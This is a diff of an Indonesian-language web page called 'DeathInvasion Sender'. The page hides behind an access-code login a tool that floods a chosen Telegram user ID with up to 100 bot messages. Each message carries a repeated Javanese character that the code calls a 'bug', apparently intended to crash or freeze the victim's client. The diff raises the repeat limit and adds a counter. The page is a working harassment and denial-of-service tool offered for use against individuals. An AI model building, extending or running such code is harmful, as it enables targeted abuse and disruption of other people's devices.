@@ -2,103 +2,47 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>DeathInvasion</title>
+  <title>DeathInvasion Sender</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      height: 100%;
-      background: #0a0a0a;
-      color: #00ff00;
-      font-family: 'Segoe UI', sans-serif;
-    }
-
-    .container {
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 4rem;
-    }
-
-    .login-box {
-      background: #161616;
-      padding: 4rem;
-      border-radius: 16px;
-      box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
-      width: 100%;
-      max-width: 700px;
-      text-align: center;
-    }
-
-    h1 {
-      margin-bottom: 2.5rem;
-      font-size: 3rem;
-      color: #00ff00;
-    }
-
-    input {
-      width: 100%;
-      padding: 1.4rem;
-      font-size: 1.5rem;
-      margin-bottom: 2rem;
-      border-radius: 10px;
-      border: none;
-      background: #222;
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
       color: #0f0;
+      text-align: center;
+      padding: 40px;
     }
-
+    input, button {
+      padding: 10px;
+      font-size: 1rem;
+      margin: 10px;
+      width: 250px;
+    }
     button {
-      width: 100%;
-      padding: 1.4rem;
-      font-size: 1.5rem;
-      background: #0f0;
-      color: #000;
-      border: none;
-      border-radius: 10px;
       cursor: pointer;
-      transition: background 0.3s;
+      background: #0f0;
+      border: none;
+      color: #000;
     }
-
-    button:hover {
-      background: #00cc00;
-    }
-
     #main, #target-section {
-      margin-top: 2.5rem;
       display: none;
-    }
-
-    label {
-      font-size: 1.3rem;
-      margin-bottom: 1rem;
-      display: block;
-      color: #aaa;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <div class="login-box">
-      <h1>💀 DeathInvasion Login</h1>
+  <h1>💀 DeathInvasion Login</h1>
 
-      <div id="login">
-        <input type="text" id="code-token" placeholder="Masukkan kode akses">
-        <button onclick="verifyCode()">🔓 Masuk</button>
-      </div>
+  <div id="login">
+    <input type="text" id="code-token" placeholder="Masukkan kode akses"><br>
+    <button onclick="verifyCode()">🔓 Masuk</button>
+  </div>
 
-      <div id="main">
-        <div id="target-section">
-          <label for="target-id">Masukkan ID Telegram Target:</label>
-          <input type="text" id="target-id" placeholder="contoh: 123456789">
-          <button onclick="sendBug()">🚀 Kirim Bug</button>
-        </div>
-      </div>
+  <div id="main">
+    <h2>💥 Sender Aktif</h2>
+    <div id="target-section">
+      <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
+      <input type="number" id="repeat-count" placeholder="Jumlah Repeat" min="1" max="100"><br>
+      <button onclick="sendBug()">🚀 Kirim Bug</button>
     </div>
   </div>
 
@@ -128,28 +72,34 @@
     }
 
     async function sendBug() {
-      const targetId = document.getElementById('target-id').value.trim();
-      if (!targetId) return alert("Isi ID dulu 😹");
+      const id = document.getElementById('target-id').value.trim();
+      const repeat = parseInt(document.getElementById('repeat-count').value);
 
-      const ultraBug = "ꦾ".repeat(1);
-      const payload = {
-        chat_id: targetId,
-        text: `*DEATH INVASION FINAL STRIKE*` + ultraBug,
-        parse_mode: "Markdown"
-      };
+      if (!id) return alert("Isi ID dulu 😹");
+      if (!repeat || repeat <= 0 || repeat > 100) return alert("Jumlah repeat tidak valid (1–100)");
 
-      for (let i = 1; i <= 5; i++) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
+      for (let i = 1; i <= repeat; i++) {
+        const payload = {
+          chat_id: id,
+          text: `💣 *DEATH INVASION [${i}/${repeat}]* 💣\n` + "ꦾ".repeat(4),
+          parse_mode: "Markdown"
+        };
 
-        console.log(`💥 Kirim [${i}/5]`);
-        await new Promise(res => setTimeout(res, 700));
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          console.log(`✅ Pesan ${i} terkirim`);
+          await new Promise(res => setTimeout(res, 600)); // delay antar pesan
+        } catch (err) {
+          console.error(`❌ Gagal kirim ${i}:`, err);
+        }
       }
 
-      alert("✅ Bug sukses terkirim!");
+      alert(`✅ Semua ${repeat} bug berhasil dikirim ke ID: ${id}`);
     }
   </script>
 
